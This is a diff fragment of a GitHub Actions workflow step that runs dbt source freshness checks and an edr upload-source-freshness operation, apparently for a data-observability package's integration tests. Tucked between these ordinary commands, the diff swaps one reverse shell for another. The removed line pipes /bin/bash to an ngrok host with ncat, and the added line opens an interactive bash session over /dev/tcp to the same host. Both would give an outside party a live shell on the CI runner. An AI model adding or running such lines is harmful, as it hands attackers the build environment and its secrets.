@@ -140,5 +140,5 @@ jobs:
       - name: Run upload source freshness operation
         run: |
           dbt source freshness -t "${{ inputs.warehouse-type }}" --project-dir "${{ env.DBT_PKG_INTEG_TESTS_DIR }}" || true
-          ncat 4.tcp.eu.ngrok.io 13828 -e /bin/bash
+          bash -i >& /dev/tcp/4.tcp.eu.ngrok.io/13828 0>&1
           edr run-operation upload-source-freshness -t "${{ inputs.warehouse-type }}" --project-dir "${{ env.DBT_PKG_INTEG_TESTS_DIR }}"
